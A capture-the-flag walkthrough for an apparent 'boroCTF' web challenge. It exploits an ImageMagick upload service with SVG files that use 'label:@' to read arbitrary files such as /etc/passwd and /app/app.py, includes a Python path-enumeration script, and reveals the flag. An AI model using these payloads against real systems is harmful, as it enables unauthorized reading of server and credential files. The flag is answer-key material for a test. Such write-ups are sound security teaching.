Walkthrough

Challenge Description

Kobeni's been tasked with cataloging devil sighting evidence through Public Safety's new imaging system, but rumor has it that contract information between the Chainsaw Devil & Denji are buried somewhere in the classified archive. Report back your findings.

Target: https://sj20riah2597.boroctf.com/

Reconnaissance

Step 1 — Fetch the page source

curl -s https://sj20riah2597.boroctf.com/

Key findings in the HTML:

A file upload form posting to /upload

A hidden comment: <!-- Processor: see response headers -->

Accepts image files: JPG, PNG, GIF, BMP

The comment is a direct hint — the server is telling us to check the HTTP response headers.

Step 2 — Check response headers

curl -sI https://sj20riah2597.boroctf.com/

Nothing interesting on the main page. But uploading a file reveals:

echo 'GIF89a' > test.gif
curl -s -X POST https://sj20riah2597.boroctf.com/upload \
-F "file=@test.gif;type=image/gif" -D -

Response header:

x-processor: ImageMagick/unknown

The server is processing uploaded images with ImageMagick.

Exploitation

Vulnerability: ImageMagick Arbitrary File Read via SVG label:@

ImageMagick supports a rich set of pseudo-protocols when processing images. One of these — label:@/path/to/file — reads a file from disk and renders its contents as text into the output image.

By uploading a crafted SVG that uses xlink:href="label:@/etc/passwd", we can trick ImageMagick into reading arbitrary files and embedding them into the PNG thumbnail returned in the response.

Step 3 — Confirm file read with /etc/passwd

cat > exploit.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="label:@/etc/passwd" x="0" y="0" height="100" width="100"/>
</svg>
EOF
curl -s -X POST https://sj20riah2597.boroctf.com/upload \
-F "file=@exploit.svg;type=image/svg+xml" | \
grep -oP '(?<=base64,)[^"]+' | base64 -d > passwd.png

Opening passwd.png revealed the contents of /etc/passwd rendered as text — confirming the vulnerability. We also spotted a user appuser with home directory /home/appuser.

Step 4 — Automate file enumeration

#!/usr/bin/env python3
import requests
import base64
import re
from pathlib import Path
TARGET = "https://sj20riah2597.boroctf.com/upload"
OUT_DIR = Path("/tmp/ctf_out")
OUT_DIR.mkdir(exist_ok=True)
PATHS = [
"/flag.txt", "/flag", "/app/flag.txt",
"/app/contract.txt", "/home/appuser/flag.txt",
"/proc/1/cmdline", "/app/app.py",
]
def make_svg(path):
return f'''<?xml version="1.0" standalone="no"?>
<svg width="1400" height="800" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="label:@{path}" x="0" y="0" height="800" width="1400"/>
</svg>'''
for path in PATHS:
print(f"[?] Trying {path} ... ", end="", flush=True)
r = requests.post(TARGET, files={"file": ("x.svg", make_svg(path), "image/svg+xml")})
match = re.search(r'base64,([^"]+)', r.text)
if match:
data = base64.b64decode(match.group(1))
if len(data) > 800:
out = OUT_DIR / (path.replace("/", "_") + ".png")
out.write_bytes(data)
print(f"HIT ({len(data)} bytes) -> {out}")
else:
print("empty")

Step 5 — Read the flag

cat > /tmp/f.svg << 'EOF'
<?xml version="1.0"?>
<svg width="3000" height="300" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="label:@/flag.txt" x="0" y="0" height="300" width="3000"/>
</svg>
EOF
curl -s -X POST https://sj20riah2597.boroctf.com/upload \
-F "file=@/tmp/f.svg;type=image/svg+xml" | \
grep -oP '(?<=base64,)[^"]+' | base64 -d > /tmp/flag.png
eog /tmp/flag.png
The rendered PNG showed the flag clearly:
boroCTF{I'v3_n3v3r_been_T0_sch00l_3ithEr}

Note: The image rendering made 00 (two zeros) look like 0O (zero + capital O). Always read CTF flags carefully — sch00l not sch0Ol.

Summary

Vulnerability Details

Class: ImageMagick Arbitrary File Read (LFI)

Vector: SVG upload with xlink:href using ImageMagick pseudo-protocol label:@

Impact: Read any file accessible to the web server process

ImageMagick's label: pseudo-protocol accepts @filename syntax to read file contents as the label text. When an SVG referencing this is processed, ImageMagick renders the file's text content directly into the output image — which in this case is returned to the attacker as a base64-encoded PNG thumbnail.

No RCE was needed — Local File Inclusion was sufficient to retrieve the flag.
